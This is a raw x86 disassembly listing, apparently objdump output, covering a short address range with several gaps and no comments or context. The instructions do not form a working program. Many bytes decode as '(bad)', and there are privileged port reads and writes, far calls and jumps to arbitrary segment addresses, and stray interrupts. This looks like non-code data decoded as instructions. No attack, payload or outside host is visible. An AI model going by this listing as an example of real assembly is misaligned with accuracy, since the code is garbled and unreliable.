  419d5d:	in     eax,0xda
  419d5f:	mov    esi,0xb8e712f
  419d64:	cmp    eax,0x866346a3
  419d69:	push   edx
  419d6a:	and    ebx,DWORD PTR [esi+0x3f]
  419d6d:	push   es
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fidiv  DWORD PTR ss:[ebx+0x20]
  419de4:	sub    esi,DWORD PTR [ecx+0x11667]
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	mov    ebp,0xd67ccb04
  419df3:	je     0x419e22
  419df5:	call   0x6b7f:0x62ce6557
  419dfc:	rcl    BYTE PTR [eax+eax*2+0x5f],0xc8
  419e01:	xchg   esp,eax
  419e02:	repnz call 0xa23c:0x3a5464c0
  419e0a:	add    al,0xd0
  419e0c:	je     0x419ddd
  419e0e:	dec    eax
  419e0f:	(bad)  
  419e10:	loope  0x419d94
  419e12:	and    DWORD PTR [ebx+0x3b],0x2d040a0e
  419e19:	cmp    al,0x69
  419e1b:	and    al,0xfc
  419e1d:	nop
  419e1e:	add    al,0xa1
  419e20:	mov    ebp,0xc8ea6ec8
  419e25:	push   ebx
  419e26:	ret    0xf19a
  419e29:	xor    dl,bl
  419e2b:	fistp  DWORD PTR [eax-0x4c59df79]
  419e31:	lods   al,BYTE PTR ds:[esi]
  419e32:	ds ss xor esi,edi
  419e36:	jmp    FWORD PTR [eax-0x646c8593]
  419e3c:	cmp    BYTE PTR [eax+0x7c8defe6],bl
  419e42:	xchg   edi,eax
  419e43:	mov    es,ebp
  419e45:	(bad)  
  419e46:	sti    
  419e47:	jmp    0x42cbfd70
  419e4c:	pusha  
  419e4d:	(bad)  
  419e4e:	cli    
  419e4f:	arpl   WORD PTR [edx-0x2b06ce22],cx
  419e55:	xchg   edx,edi
  419e57:	add    edx,DWORD PTR [ebx]
  419e59:	dec    ebx
  419e5a:	sub    edx,DWORD PTR [eax]
  419e5c:	sbb    esi,DWORD PTR es:[eax+0x182b780a]
  419e63:	xor    BYTE PTR [edi+0x3240c309],dl
  419e69:	out    0xf,al
  419e6b:	push   esp
  419e6c:	pop    ebp
  419e6d:	push   ebp
  419e6e:	lahf   
  419e6f:	mov    ds:0x52580734,al
  419e74:	paddq  mm6,mm0
  419e77:	mov    ah,0x84
  419e79:	push   edx
  419e7a:	outs   dx,BYTE PTR ds:[esi]
  419e7b:	sbb    BYTE PTR [ebx-0x1f],bl
  419e7e:	pop    edx
  419e7f:	xchg   esi,eax
  419e80:	xchg   esi,eax
  419e81:	popa   
  419e82:	dec    ebx
  419e83:	std    
  419e84:	jmp    0x419e2f
  419e86:	jb     0x419f03
  419e88:	(bad)  
  419e8a:	jo     0x419e33
  419e8c:	aaa    
  419e8d:	cmp    al,0x59
  419e8f:	out    0x4f,eax
  419e91:	das    
  419e92:	fidivr WORD PTR [ebp+0x61]
  419e95:	inc    ecx
  419e96:	xor    al,ch
  419e98:	inc    edi
  419e99:	nop
  419e9a:	fbstp  TBYTE PTR [edi+0x495b9d4]
  419ea0:	jge    0x419e3e
  419ea2:	inc    ecx
  419ea3:	and    eax,0xda27dd0f
  419ea8:	pusha  
  419ea9:	pop    ecx
  419eaa:	sbb    eax,DWORD PTR [edi+0x21]
  419ead:	add    esp,edi
  419eaf:	imul   edi,DWORD PTR [ecx+0x506cae83],0x49
  419eb6:	dec    DWORD PTR [ebx-0x80]
  419eb9:	mov    al,0x2a
  419ebb:	(bad)  
  419ebc:	stos   BYTE PTR es:[edi],al
  419ebd:	scas   eax,DWORD PTR es:[edi]
  419ebe:	ffreep st(0)
  419ec0:	jp     0x419ea7
  419ec2:	inc    DWORD PTR [eax]
  419ec4:	pop    edi
  419ec5:	idiv   BYTE PTR [edi]
  419ec7:	shl    dh,0x50
  419eca:	int    0x56
  419ecc:	int    0xc3
  419ece:	cmc    
  419ecf:	inc    esp
  419ed0:	sbb    ah,BYTE PTR [ecx-0x6adb2f51]
  419ed6:	out    dx,eax
  419ed7:	or     DWORD PTR [edx+0x7f550769],eax
  419edd:	inc    ebx
  419ede:	xor    dh,BYTE PTR [edi+0x21a9159a]
  419ee4:	xchg   ebp,eax
  419ee5:	mov    edx,0xcd366edf
  419eea:	call   0x0:0xb99f0e
	...
  419f55:	add    BYTE PTR [edi+0x5fc517d8],al
  419f5b:	iret   
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	stos   BYTE PTR es:[edi],al
  419f63:	aad    0x7b
  419f65:	call   0x100:0x11767
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	mov    ebp,esi
  419f70:	jo     0x419eff
  419f72:	mov    ah,0xea
  419f74:	sti    
  419f75:	cld    
  419f76:	adc    al,0xc9
  419f78:	add    al,0xa2
  419f7a:	mov    eax,0x8d4b1442
  419f7f:	pushf  
  419f80:	sub    bl,dl
  419f82:	xor    dh,BYTE PTR [ebx]
  419f84:	cmp    DWORD PTR [ecx-0x1b],0xfffffff7
  419f88:	lea    esi,[ebp+edx*2-0x33]
  419f8c:	cmp    BYTE PTR [esi+eiz*8],bl
  419f8f:	inc    esi
  419f90:	inc    ebp
  419f91:	pop    es
  419f92:	rcr    DWORD PTR [esi-0x77],cl
  419f95:	inc    ebx
  419f96:	fcom   DWORD PTR [ebp+eax*4+0xb]
  419f9a:	or     DWORD PTR ds:0xae569484,ebx
  419fa0:	xlat   BYTE PTR ds:[ebx]
  419fa1:	xor    ah,BYTE PTR [ebp-0x50]
  419fa4:	leave  
  419fa5:	mov    WORD PTR [ecx-0x1e],ds
  419fa8:	mov    ch,0x7f
  419faa:	dec    bp
  419fac:	mov    ebx,0x14cd11ba
  419fb1:	jae    0x41a00f
  419fb3:	push   esp
  419fb4:	lods   al,BYTE PTR ds:[esi]
  419fb5:	mov    WORD PTR [edi+edx*4+0x6c],fs
  419fb9:	fsub   QWORD PTR [esi-0x2b8b01f3]
  419fbf:	push   ecx
  419fc0:	mov    ch,BYTE PTR [edx-0x381a4e78]
  419fc6:	scas   eax,DWORD PTR es:[edi]
  419fc7:	push   edi
  419fc8:	(bad)  
  419fc9:	paddd  mm0,QWORD PTR [ebx-0xa]
  419fcd:	push   esi
  419fce:	in     al,0x40
  419fd0:	cdq    
  419fd1:	leave  
  419fd2:	adc    esi,esp
  419fd4:	sar    DWORD PTR [edi],1
  419fd6:	push   ds
  419fd7:	in     al,dx
  419fd8:	jmp    0xccd11e00
  419fdd:	cmp    BYTE PTR [ebp+0x12],dh
  419fe0:	in     eax,dx
  419fe1:	jo     0x41a00c
  419fe3:	push   ss
  419fe4:	cld    
  419fe5:	add    esi,edi
  419fe7:	xor    ebp,DWORD PTR gs:[ebp-0x2a]
  419feb:	xor    DWORD PTR [eax-0xbea549e],0x612581a0
  419ff5:	mov    esi,0xc8f393e4
  419ffa:	sub    BYTE PTR [ecx-0x38],dl
  419ffd:	pop    ss
  419ffe:	cmp    DWORD PTR [esi+ecx*1],edx
  41a001:	hlt    
  41a002:	loope  0x41a02f
  41a004:	mov    ds:0xb43eb092,eax
  41a009:	call   0x6d10:0x1a243a9a
  41a010:	ret    0xc01a
  41a013:	inc    edi
  41a014:	sub    eax,0xd4338efb
  41a019:	retf   0x6d2a
  41a01c:	xor    DWORD PTR [edx+0x70c70702],esi
  41a022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a023:	imul   eax,edx,0x15
  41a026:	loopne 0x41a081
  41a028:	mov    dh,0xf2
  41a02a:	mov    edi,0xdc5e0d87
  41a02f:	sub    DWORD PTR [eax+0x2ca81030],edi
  41a035:	add    bl,BYTE PTR ds:0x674e185
  41a03b:	and    ebp,DWORD PTR [ebx+0x1a]
  41a03e:	adc    dh,dh
  41a040:	fwait
  41a041:	pop    ecx
  41a042:	inc    esi
  41a043:	mov    WORD PTR [edx+0x47],cs
  41a046:	(bad)  
  41a048:	sub    al,0xf6
  41a04a:	out    0xd5,eax
  41a04c:	mov    dl,0x40
  41a04e:	dec    ebp
  41a04f:	cmp    al,0xf7
  41a051:	xor    ebx,ecx
  41a053:	push   esi
  41a054:	pop    es
  41a055:	loope  0x41a004
  41a057:	inc    ebx
  41a058:	ins    DWORD PTR es:[edi],dx
  41a059:	call   0x8ef6c084
  41a05e:	mov    ecx,DWORD PTR [edi]
  41a060:	sbb    eax,0xc02c18be
  41a065:	fs jmp 0x41a0d6
  41a068:	mov    esi,0x6a821773
  41a06d:	nop
	...
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x49],bh
  41a0e3:	cmp    eax,0x18676055
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	add    BYTE PTR [ecx],al
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	pop    ss
  41a0ef:	mov    eax,ds:0xe274b299
  41a0f4:	nop
  41a0f5:	jl     0x41a09a
  41a0f7:	mov    bh,ah
  41a0f9:	add    eax,0xdd2ac4d5
  41a0fe:	out    dx,eax
  41a0ff:	push   cs
  41a100:	jmp    0x63384720
  41a105:	sub    ch,BYTE PTR [edi+0x74976779]
  41a10b:	jl     0x41a0cc
  41a10d:	hlt    
  41a10e:	lds    eax,FWORD PTR [ecx+0x73]
  41a111:	push   es
  41a112:	inc    eax
  41a113:	push   0xe520551
  41a118:	pop    edi
  41a119:	xor    al,BYTE PTR [ebx-0x70]
  41a11c:	imul   ebp,DWORD PTR [ecx+0x6ec71329],0xffffffdc
  41a123:	iret   
  41a124:	pusha  
  41a125:	and    eax,0xb05f2cb5
  41a12a:	dec    edi
  41a12b:	call   0xbdf4:0x7aea8cde
  41a132:	test   BYTE PTR [ebx],dh
  41a134:	push   ss
  41a135:	mov    ch,0x72
  41a137:	sahf   
  41a138:	or     bl,cl
  41a13a:	push   cs
  41a13b:	test   BYTE PTR [ecx],0x27
  41a13e:	jp     0x41a180
  41a140:	sbb    BYTE PTR [ecx-0x79e90147],dl
  41a146:	jne    0x41a12f
  41a148:	dec    esp
  41a149:	add    DWORD PTR [eax-0x1da2d67e],esi
  41a14f:	loope  0x41a111
  41a151:	cmp    eax,0x210a411a
  41a156:	not    BYTE PTR [ecx-0x1c]
  41a159:	das    
  41a15a:	xchg   ebp,eax
  41a15b:	cmp    esp,DWORD PTR [edi+0x78ec72a]
  41a161:	mov    bh,0xaf
  41a163:	enter  0xc3b6,0x11
  41a167:	jbe    0x41a11f
  41a169:	and    eax,esi
  41a16b:	hlt    
  41a16c:	shr    BYTE PTR [edi-0x7b],0xf0
  41a170:	into   
  41a171:	in     eax,dx
  41a172:	imul   ebp,DWORD PTR [eax-0x23],0xffffff86
  41a176:	add    eax,esi
  41a178:	(bad)
  41a17c:	mov    ds:0x849fb1bb,al
  41a181:	icebp  
  41a182:	jmp    0x41a186
  41a184:	cmc    
  41a185:	loop   0x41a1df
  41a187:	cmc    
  41a188:	dec    eax
  41a189:	dec    esi
  41a18a:	fsubr  QWORD PTR ds:0x2ab3615c
  41a190:	mov    ecx,0x48a5ddd1
  41a195:	inc    edx
  41a196:	retf   0x941b
  41a199:	jns    0x41a215
  41a19b:	add    al,0xd
  41a19d:	daa    
  41a19e:	imul   edx,edx,0x226bac7
  41a1a4:	rcl    BYTE PTR es:[eax+ebx*4],0x42
  41a1a9:	pusha  
  41a1aa:	(bad)  
  41a1ab:	xchg   ecx,eax
  41a1ac:	jecxz  0x41a17c
  41a1ae:	sub    ah,bl
  41a1b0:	sub    BYTE PTR [edx+0x41f44275],al
  41a1b6:	dec    al
  41a1b8:	xchg   ebx,eax
  41a1b9:	fucomp st(0)
  41a1bb:	adc    eax,0x163b495f
  41a1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1c1:	xchg   sp,ax
  41a1c3:	push   edx
  41a1c4:	popf   
  41a1c5:	pop    esp
  41a1c6:	mov    ch,BYTE PTR [eax+0x518f00f1]
  41a1cc:	dec    edi
  41a1cd:	int3   
  41a1ce:	push   ebp
  41a1cf:	arpl   si,sp
  41a1d1:	add    ecx,eax
  41a1d3:	and    al,0x83
  41a1d5:	dec    ecx
  41a1d6:	loop   0x41a1d5
  41a1d8:	jo     0x41a208
  41a1da:	lods   eax,DWORD PTR ds:[esi]
  41a1db:	inc    esp
  41a1dc:	mov    eax,0xdc05da13
  41a1e1:	push   ebp
  41a1e2:	cmp    dl,BYTE PTR [edi+0x442963ef]
  41a1e8:	fld    TBYTE PTR ds:0xef4afbfd
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	lahf   
  41a263:	data16 je 0x41a23d
  41a266:	sbb    DWORD PTR [bx+di],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR [edi+0x74],al
  41a270:	mov    al,0x8e
  41a272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a273:	fmul   QWORD PTR [ebp-0x4e235fbd]
  41a279:	enter  0x4a0a,0x85
  41a27d:	lahf   
  41a27e:	div    edi
  41a280:	fisttp QWORD PTR [ecx+0x5bdbce49]
  41a286:	mov    cl,0x63
  41a288:	adc    ebp,ebx
  41a28a:	cwde   
  41a28b:	inc    esp
  41a28c:	pop    edx
  41a28d:	fcom   DWORD PTR [ebx]
  41a28f:	imul   edi,DWORD PTR [edi],0x60
  41a292:	push   eax
  41a293:	inc    esi
  41a294:	or     BYTE PTR [eax+0x6e70d433],al
  41a29a:	add    eax,0x57db5a5c
  41a29f:	es mov dl,0xe6
  41a2a2:	loopne 0x41a294
  41a2a4:	pop    esp
  41a2a5:	xor    edi,edi
  41a2a7:	lea    edx,[eax]
  41a2a9:	xchg   esi,eax
  41a2aa:	out    dx,eax
  41a2ab:	mov    ebx,0x8ea1bf0a
  41a2b0:	jmp    0x2985e446
  41a2b5:	cmp    bh,BYTE PTR [edx-0x1e25fd69]
  41a2bb:	scas   al,BYTE PTR es:[edi]
  41a2bc:	pop    esp
  41a2bd:	jp     0x41a24f
  41a2bf:	jp     0x41a31b
  41a2c1:	dec    esi
  41a2c2:	mov    bl,0x29
  41a2c4:	jmp    0x9436a9e5
  41a2c9:	mov    eax,ds:0xe908f0d8
  41a2ce:	fcom   st(7)
  41a2d0:	xchg   ebp,eax
  41a2d1:	pop    edi
  41a2d2:	mov    esp,ecx
  41a2d4:	outs   dx,BYTE PTR ds:[esi]
  41a2d5:	mov    eax,0x5b464401
  41a2da:	rol    bl,cl
  41a2dc:	inc    ebp
  41a2dd:	or     al,0x2a
  41a2df:	or     DWORD PTR [esi],ecx
  41a2e1:	lds    ebx,FWORD PTR [edi+eax*4]
  41a2e4:	test   eax,0xf49023f7
  41a2e9:	loope  0x41a30d
  41a2eb:	mov    esi,0xc03ca1f5
  41a2f0:	(bad)  
  41a2f1:	jmp    0x44d3e2a9
  41a2f6:	add    al,BYTE PTR [esi-0x784053bc]
  41a2fc:	xor    BYTE PTR [ebx],dh
  41a2fe:	sar    ebx,cl
  41a300:	(bad)  
  41a301:	mov    edx,0xc598842f
  41a306:	cmp    dh,bh
  41a308:	xchg   BYTE PTR [eax+0x44],dl
  41a30b:	push   eax
  41a30c:	fimul  DWORD PTR [eax+0x67]
  41a30f:	sahf   
  41a310:	adc    al,0x80
  41a312:	repnz sbb ebp,esi
  41a315:	imul   eax,DWORD PTR [ebx-0x61985272],0x20
  41a31c:	mov    al,ds:0x4485bfdb
  41a321:	jp     0x41a376
  41a323:	xchg   BYTE PTR [esi],dl
  41a325:	adc    dl,BYTE PTR [edi+0x1b]
  41a328:	pop    ds
  41a329:	stc    
  41a32a:	adc    al,0x84
  41a32c:	fiadd  WORD PTR [eax+0x7b9f7c14]
  41a332:	mov    ebx,0x328411e
  41a337:	pop    ebx
  41a338:	mov    ds:0xdeb156ea,al
  41a33d:	outs   dx,DWORD PTR ds:[esi]
  41a33e:	scas   eax,DWORD PTR es:[edi]
  41a33f:	cmc    
  41a340:	data16 jp 0x41a35d
  41a343:	loopne 0x41a395
  41a345:	mov    DWORD PTR [eax+0x1c],ecx
  41a348:	xchg   esp,eax
  41a349:	nop
  41a34a:	sti    
  41a34b:	mov    esi,0x63396c44
  41a350:	gs jnp 0x41a303
  41a353:	cmp    eax,0xcb17a0c5
  41a358:	dec    ecx
  41a359:	xor    DWORD PTR [ebp+eiz*4+0x5e],edi
  41a35d:	cmp    eax,0x64f3049d
  41a362:	aam    0x7b
  41a364:	jo     0x41a325
  41a366:	dec    esi
  41a367:	shl    dh,1
  41a369:	adc    eax,0x7086e2a1
	...
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	idiv   esi
  41a3e4:	(bad)  
  41a3e5:	and    BYTE PTR [edi+0x1a],ah
  41a3e8:	add    DWORD PTR [eax],eax
  41a3ea:	add    BYTE PTR [ecx],al
  41a3ec:	add    BYTE PTR [eax],al
  41a3ee:	fcom   DWORD PTR [esi-0x4c459949]
  41a3f5:	xchg   esi,eax
  41a3f6:	daa    
  41a3f7:	dec    edx
  41a3f8:	push   ebp
  41a3f9:	fcomi  st,st(7)
  41a3fb:	or     BYTE PTR [edi+0x68bc9e89],0x5f
  41a402:	sub    bh,ch
  41a404:	(bad)  
  41a405:	mov    esp,DWORD PTR [esp+ecx*4]
  41a408:	pop    ds
  41a409:	and    edi,edx
  41a40b:	mov    esp,0x4358672e
  41a410:	mov    ecx,0x5e51cac8
  41a415:	and    DWORD PTR [eax],0xb2a40d4
  41a41b:	cmp    al,0x9d
  41a41d:	adc    BYTE PTR [ecx],0x2f
  41a420:	mov    al,0xc8
  41a422:	jecxz  0x41a3f1
  41a424:	call   0x36145811
  41a429:	je     0x41a4a6
  41a42b:	mov    esp,0xc941b1ec
  41a430:	inc    esp
  41a431:	dec    esp
  41a432:	or     BYTE PTR [ebx+0x3708e813],bh
  41a438:	xchg   ebx,eax
  41a439:	add    al,BYTE PTR [edi-0x64d5da16]
  41a43f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a440:	addr16 mov dl,0x38
  41a443:	pushf  
  41a444:	aaa    
  41a445:	xchg   esp,eax
  41a446:	or     DWORD PTR [eax],ebp
  41a448:	loop   0x41a442
  41a44a:	mov    edx,0x8a05b1a0
  41a44f:	(bad)  
  41a450:	shr    ebx,cl
  41a452:	dec    esp
  41a453:	neg    DWORD PTR ds:0x277defb
  41a459:	ins    DWORD PTR es:[edi],dx
  41a45a:	cmovl  ebp,DWORD PTR [ebx-0x6f9387c8]
  41a461:	jnp    0x41a3ff
  41a463:	cwde   
  41a464:	cs into 
  41a466:	je     0x41a4cc
  41a468:	sbb    dl,BYTE PTR [esi]
  41a46a:	xor    BYTE PTR [esi-0x426a116a],dh
  41a470:	aaa    
  41a471:	jb     0x41a423
  41a473:	jno    0x41a4ca
  41a475:	lahf   
  41a476:	imul   esi,DWORD PTR [esi-0x6f],0xffffff94
  41a47a:	ror    BYTE PTR [esi+esi*4+0x21],1
  41a47e:	addr16 cdq 
  41a480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a481:	popa   
  41a482:	dec    edi
  41a483:	pop    esp
  41a484:	sub    eax,0xe0e4a7a3
  41a489:	pop    edi
  41a48a:	pop    eax
  41a48b:	push   0x62bb2923
  41a490:	ficomp DWORD PTR [ecx-0x122204c6]
  41a496:	hlt    
  41a497:	xor    esi,DWORD PTR [ebp+eiz*4-0x1a5542a3]
  41a49e:	jns    0x41a473
  41a4a0:	(bad)  [eax+0x6916edf1]
  41a4a6:	inc    eax
  41a4a7:	sar    DWORD PTR [esp+eax*8-0xe],1
  41a4ab:	or     BYTE PTR [eax+edx*1],dh
  41a4ae:	xchg   edx,eax
  41a4af:	add    al,0xa2
  41a4b1:	xchg   edi,eax
  41a4b2:	and    DWORD PTR [esi+0x24],esp
  41a4b5:	enter  0x3933,0xb9
  41a4b9:	out    0xd6,eax
  41a4bb:	mov    ecx,esp
  41a4bd:	jle    0x41a492
  41a4bf:	sub    BYTE PTR [ebx],al
  41a4c1:	nop
  41a4c2:	or     al,0xcd
  41a4c4:	nop
  41a4c5:	jmp    0xa4f7a723
  41a4ca:	push   ecx
  41a4cb:	xchg   ebx,eax
  41a4cc:	test   DWORD PTR [eax+0x30],0x914aa97d
  41a4d3:	outs   dx,DWORD PTR ss:[esi]
  41a4d5:	ror    BYTE PTR [esi+0x2f510c5b],1
  41a4db:	jmp    0x41a508
  41a4dd:	mov    ebx,0x61826775
  41a4e2:	push   0x73990cc7
  41a4e7:	iret   
  41a4e8:	dec    ebp
  41a4e9:	adc    ebp,DWORD PTR [edi-0x10]
  41a4ec:	jne    0x41a519
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	out    dx,al
  41a563:	pusha  
  41a564:	or     dh,BYTE PTR [edi+eiz*2+0x1b]
  41a568:	add    DWORD PTR [eax],eax
  41a56a:	add    BYTE PTR [ecx],al
  41a56c:	add    BYTE PTR [eax],al
  41a56e:	jbe    0x41a54b
  41a570:	xchg   ebp,eax
  41a571:	xor    ah,bh
  41a573:	fisub  WORD PTR [edi+0x75c62827]
  41a579:	sar    ah,1
  41a57b:	xor    eax,0x1ca9f6d9
  41a580:	inc    eax
  41a581:	mov    al,ds:0xc5c3281a
  41a586:	jnp    0x41a5e2
  41a588:	aam    0x8
  41a58a:	rcr    esi,cl
  41a58c:	sbb    eax,0x9fb26ea9
  41a591:	inc    ebp
  41a592:	js     0x41a598
  41a594:	jl     0x41a533
  41a596:	and    cl,BYTE PTR [ecx+0x42e65cb2]
  41a59c:	je     0x41a52b
  41a59e:	cmp    ebx,DWORD PTR [ebx-0x24]
  41a5a1:	aaa    
  41a5a2:	and    eax,0x304ee6e9
  41a5a7:	jmp    0xde3a:0x1ef4cf68
  41a5ae:	mov    ds:0x291c5bdb,eax
  41a5b3:	pushf  
  41a5b4:	outs   dx,DWORD PTR ds:[esi]
  41a5b5:	aad    0x64
  41a5b7:	cmc    
  41a5b8:	rcl    BYTE PTR ds:0x26b5c47d,1
  41a5be:	popa   
  41a5bf:	mov    ecx,0x5be135f1
  41a5c4:	cmp    eax,0xe9532f9d
  41a5c9:	ss ins DWORD PTR es:[edi],dx
  41a5cb:	dec    esi
  41a5cc:	addr16 push eax
  41a5ce:	jmp    0xc5b4c333
  41a5d3:	fidiv  WORD PTR cs:[eax-0x9]
  41a5d7:	mov    al,0x11
  41a5d9:	in     al,0xc
  41a5db:	ja     0x41a5c0
  41a5dd:	adc    edi,DWORD PTR [ecx]
  41a5df:	and    esi,DWORD PTR [ecx-0x47]
  41a5e2:	and    dh,cl
  41a5e4:	outs   dx,BYTE PTR ds:[esi]
  41a5e5:	mov    bh,0x35
  41a5e7:	mov    ds:0x3ec6ecbd,al
  41a5ec:	loop   0x41a590
  41a5ee:	mov    eax,ds:0xebb1da2f
  41a5f3:	or     DWORD PTR [edi+ebp*4+0x37390a01],ebp
  41a5fa:	mov    ecx,0x8c719a3c
  41a5ff:	div    BYTE PTR [ecx+0x4e]
  41a602:	push   ebp
  41a603:	xchg   edi,eax
  41a604:	push   ebp
  41a605:	and    al,0x66
  41a607:	mov    ds:0x1ad92323,al
  41a60c:	test   eax,0xdfe98ad7
  41a611:	and    BYTE PTR [edx],0xf0
  41a614:	outs   dx,BYTE PTR ds:[esi]
  41a615:	ss dec edi
  41a617:	stos   BYTE PTR es:[edi],al
  41a618:	into   
  41a619:	aad    0x8
  41a61b:	add    DWORD PTR [ebx+0x20acee12],esp
  41a621:	cwde   
  41a622:	sbb    dl,bh
  41a624:	xchg   edi,eax
  41a625:	mov    BYTE PTR [esi-0x2304c8ec],dh
  41a62b:	(bad)  
  41a62c:	call   0x2cc239c6
  41a631:	cwde   
  41a632:	leave  
  41a633:	mov    ds:0x13aab231,eax
  41a638:	dec    DWORD PTR [ebp+0x4aa7d329]
  41a63e:	jle    0x41a680
  41a640:	xor    eax,0x5c0ab5c4
  41a645:	dec    ebp
  41a646:	rol    DWORD PTR [ebx-0x10],cl
  41a649:	inc    edi
  41a64a:	stc    
  41a64b:	xchg   DWORD PTR [ebp+0x7a6d87e9],esp
  41a651:	sub    ebx,DWORD PTR [eax+0x64]
  41a654:	mov    ch,0xeb
  41a656:	mov    edx,0x345a7377
  41a65b:	inc    ecx
  41a65c:	jnp    0x41a613
  41a65e:	sub    al,0x31
  41a660:	pop    esp
  41a661:	push   eax
  41a662:	push   0xc9889580
  41a667:	dec    edi
  41a668:	pop    ebx
  41a669:	push   es
  41a66a:	jmp    0xe13928
	...
  41a6d3:	add    BYTE PTR [eax],al
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x475a625
  41a6e4:	cli    
  41a6e5:	or     al,0x67
  41a6e7:	sbb    al,0x1
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    BYTE PTR [edx+0x2b],bl
  41a6f0:	cmovg  ebx,DWORD PTR [edx+0x2d63cc8c]
  41a6f7:	fstp   TBYTE PTR [edx-0x1280f3b7]
  41a6fd:	add    edi,ebx
  41a6ff:	dec    edx
  41a700:	dec    BYTE PTR [edi+eax*2+0x69]
  41a704:	sub    eax,0xcb1e92b5
  41a709:	or     DWORD PTR [edx+eax*1+0xa41ed88],ecx
  41a710:	jl     0x41a72e
  41a712:	add    esp,DWORD PTR [esi+esi*1-0x78e6be45]
  41a719:	xor    al,bh
  41a71b:	repnz add DWORD PTR [eax+ecx*8],ebp
  41a71f:	inc    ebx
  41a720:	dec    ebx
  41a721:	iret   
  41a722:	jmp    0x41a6bc
  41a724:	adc    al,0x14
  41a726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a727:	call   0x8de1:0x3890f2c
  41a72e:	jmp    0x7891:0x9e006119
  41a735:	jno    0x41a76e
  41a737:	mov    eax,ds:0x7350db1f
  41a73c:	and    al,0xde
  41a73e:	pop    ebp
  41a73f:	out    dx,al
  41a740:	(bad)  
  41a741:	and    BYTE PTR [edx+0x43],bh
  41a744:	lds    ebx,FWORD PTR [edi+0x21944c00]
  41a74a:	and    BYTE PTR [esi-0x2c],cl
  41a74d:	mov    al,0xa3
  41a74f:	fwait
  41a750:	mov    edx,DWORD PTR [esi+edi*4-0x38]
  41a754:	adc    edx,ebx
  41a756:	out    0xf8,eax
  41a758:	xchg   ebx,eax
  41a759:	inc    edx
  41a75a:	push   edx
  41a75b:	aad    0xfe
  41a75d:	aad    0x59
  41a75f:	pop    eax
  41a760:	stos   BYTE PTR es:[edi],al
  41a761:	imul   edi,DWORD PTR [edi+0x29c6ad98],0x788bd0e1
  41a76b:	mov    ebx,DWORD PTR [ecx+0x66a9df34]
  41a771:	out    0x76,eax
  41a773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a774:	ins    BYTE PTR es:[edi],dx
  41a775:	das    
  41a776:	retf   0xf6e5
  41a779:	loope  0x41a791
  41a77b:	mov    ebx,esi
  41a77d:	dec    ebx
  41a77e:	js     0x41a727
  41a780:	sti    
  41a781:	gs in  al,0xfc
  41a784:	(bad)  [eax-0x75efb59a]
  41a78a:	jno    0x41a73e
  41a78c:	or     dh,BYTE PTR [eax-0x46]
  41a78f:	sub    dh,bl
  41a791:	push   es
  41a792:	xor    DWORD PTR [ecx+0x568b9782],edi
  41a798:	and    BYTE PTR gs:[ebx+0x17d40ed2],ch
  41a79f:	jp     0x41a7e1
  41a7a1:	ins    BYTE PTR es:[edi],dx
  41a7a2:	jno    0x41a7ae
  41a7a4:	out    0x6d,eax
  41a7a6:	and    BYTE PTR [ecx+0x37447f0e],al
  41a7ac:	leave  
  41a7ad:	popa   
  41a7ae:	rcl    edx,1
  41a7b0:	adc    al,0x37
  41a7b2:	xor    eax,0x3bcd435
  41a7b7:	jg     0x41a7c5
  41a7b9:	retf   0xf722
  41a7bc:	jge    0x41a820
  41a7be:	push   edi
  41a7bf:	push   ds
  41a7c0:	pushf  
  41a7c1:	(bad)  
  41a7c2:	lods   eax,DWORD PTR ds:[esi]
  41a7c3:	retf   0x8c20
  41a7c6:	pop    ds
  41a7c7:	adc    DWORD PTR [ecx+eax*4+0x690ba909],0xfcdf9fe2
  41a7d2:	ret    
  41a7d3:	push   ecx
  41a7d4:	ss mov dl,0xd0
  41a7d7:	div    dh
  41a7d9:	jl     0x41a83c
  41a7db:	je     0x41a7e0
  41a7dd:	dec    eax
  41a7de:	std    
  41a7df:	rol    BYTE PTR [edx+edx*4-0x30],0x17
  41a7e4:	mov    edi,0x8b32185f
  41a7e9:	xor    ecx,DWORD PTR [edi+0x13]
  41a7ec:	dec    eax
  41a7ed:	pop    ds
	...
  41a856:	repz xchg edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0xce5327ca,al
  41a863:	cld    
